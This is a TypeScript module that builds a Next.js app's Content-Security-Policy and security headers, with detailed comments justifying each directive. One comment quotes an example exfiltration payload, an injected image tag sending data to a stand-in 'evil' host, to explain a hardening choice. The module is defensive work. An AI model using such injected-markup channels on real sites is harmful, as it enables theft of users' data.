/**
 * Security response headers — a PURE module.
 *
 * Applied by `src/proxy.ts` to every response, so a new route is covered the
 * moment it exists rather than when somebody remembers to add it.
 */

/**
 * Build the Content-Security-Policy.
 *
 * ## Why a nonce, and why `strict-dynamic`
 *
 * Next.js injects inline scripts to hydrate — the flight payload, the theme
 * script, the route manifest. A policy without `'unsafe-inline'` breaks the
 * app; a policy *with* it is barely a policy at all, because the whole point of
 * script-src is to stop injected script from running.
 *
 * A per-request nonce is the way out: Next stamps it on the scripts it emits,
 * so those run and an injected `<script>` does not. `'strict-dynamic'` then
 * lets a nonced script load its own chunks without every chunk URL having to be
 * listed — which is necessary because chunk names are content-hashed and change
 * every build.
 *
 * `'unsafe-inline'` is still listed after the nonce. That is not a hole: a
 * browser that understands nonces **ignores** `'unsafe-inline'` when one is
 * present. It is there only so an old browser degrades to working-but-permissive
 * rather than to a blank page.
 *
 * ## Development
 *
 * `'unsafe-eval'` is added in development only — the dev-mode React refresh
 * runtime needs it. Production never has it.
 */
export function buildContentSecurityPolicy(params: {
  nonce: string;
  isDevelopment: boolean;
  /** The Supabase project origin, which the browser calls directly for auth. */
  supabaseOrigin: string | null;
}): string {
  const scriptSrc = [
    "'self'",
    `'nonce-${params.nonce}'`,
    "'strict-dynamic'",
    "'unsafe-inline'",
    ...(params.isDevelopment ? ["'unsafe-eval'"] : []),
  ];

  /*
   * `connect-src` is `'self'` and nothing else.
   *
   * That is stricter than a Supabase application usually manages, and it is
   * possible here because **the browser never calls Supabase**. Sign-in and
   * sign-out are Server Actions, session refresh happens in the proxy, and
   * every Meta and Anthropic call is server-side. `createSupabaseBrowserClient`
   * exists in `lib/supabase/client.ts` for completeness but nothing imports it,
   * so no Supabase URL is even present in a client chunk —
   * `tests/bundle-secrets.test.ts` asserts that.
   *
   * The project origin is still accepted as a parameter and added when given,
   * so that introducing a browser-side feature — Realtime, client-side auth —
   * is a one-line change here rather than a debugging session against an
   * unexplained CSP violation.
   */
  const connectSrc = ["'self'", ...(params.supabaseOrigin ? [params.supabaseOrigin] : [])];
  if (params.isDevelopment) connectSrc.push("ws:", "wss:");

  const directives: Record<string, string[]> = {
    "default-src": ["'self'"],
    "script-src": scriptSrc,
    // Tailwind and the theme variables are injected as a style element, and
    // there is no nonce plumbing for styles in Next. Inline style cannot
    // exfiltrate on its own, so this is a far smaller concession than the
    // script equivalent.
    "style-src": ["'self'", "'unsafe-inline'"],
    /*
     * No `https:` wildcard.
     *
     * It was there in case Facebook thumbnails were ever embedded. They are
     * not: the app links to permalinks and renders no remote image, so the
     * wildcard bought nothing and permitted every host on the internet as an
     * exfiltration target — an injected `<img src="https://evil/?d=...">` is a
     * working data channel even when script is blocked.
     *
     * `data:` and `blob:` stay: Recharts renders inline SVG and the CSV export
     * builds a blob URL for the download.
     */
    "img-src": ["'self'", "data:", "blob:"],
    "font-src": ["'self'", "data:"],
    "connect-src": connectSrc,
    // No Facebook SDK, no third-party embeds, nothing to frame.
    "frame-src": ["'none'"],
    "object-src": ["'none'"],
    // Stops a `<base>` tag injected into the DOM from re-pointing every
    // relative URL in the page at an attacker's host.
    "base-uri": ["'self'"],
    /*
     * Facebook is here because the self-service Page connection posts a form to
     * `/api/connect/{token}/start`, which answers with a 303 to Facebook's
     * OAuth dialog.
     *
     * Chrome applies `form-action` to the *redirect target* of a form
     * submission, not only to the immediate action — so `'self'` alone silently
     * blocks the navigation and the streamer's button appears to do nothing.
     * The failure is invisible outside the console, which is why it is worth a
     * comment rather than a rediscovery.
     *
     * Narrow on purpose: one host, the one we deliberately send people to. A
     * `https:` wildcard here would make every form on the site a working
     * exfiltration channel for an injected `<form>`.
     */
    "form-action": ["'self'", "https://www.facebook.com"],
    "frame-ancestors": ["'none'"],
    "manifest-src": ["'self'"],
    "worker-src": ["'self'", "blob:"],
  };

  const policy = Object.entries(directives)
    .map(([directive, values]) => `${directive} ${values.join(" ")}`)
    .join("; ");

  // Only meaningful over HTTPS, and it would break a plain-HTTP dev server.
  return params.isDevelopment ? policy : `${policy}; upgrade-insecure-requests`;
}

/**
 * Everything that is not the CSP.
 *
 * `Strict-Transport-Security` is production-only: sending it from a
 * `http://localhost` dev server would teach the browser to force HTTPS on
 * localhost for the next two years, which is a genuinely annoying thing to undo.
 */
export function buildSecurityHeaders(params: { isDevelopment: boolean }): Record<string, string> {
  const headers: Record<string, string> = {
    // Belt and braces with `frame-ancestors` above, for older browsers.
    "X-Frame-Options": "DENY",
    "X-Content-Type-Options": "nosniff",
    // Send the full URL within our own origin, only the origin to anyone else —
    // so a Page id in a path never leaks in a referer to a third party.
    "Referrer-Policy": "strict-origin-when-cross-origin",
    // Nothing in this application uses any of these.
    "Permissions-Policy": [
      "camera=()",
      "microphone=()",
      "geolocation=()",
      "payment=()",
      "usb=()",
      "interest-cohort=()",
    ].join(", "),
    // Keeps the tab out of a cross-origin browsing-context group, which is what
    // makes Spectre-style cross-origin reads impractical.
    "Cross-Origin-Opener-Policy": "same-origin",
    "Cross-Origin-Resource-Policy": "same-origin",
    "X-DNS-Prefetch-Control": "off",
  };

  if (!params.isDevelopment) {
    headers["Strict-Transport-Security"] = "max-age=63072000; includeSubDomains; preload";
  }

  return headers;
}

/** Extract an origin for the CSP, tolerating a malformed or absent URL. */
export function originOf(url: string | undefined): string | null {
  if (!url) return null;
  try {
    return new URL(url).origin;
  } catch {
    return null;
  }
}
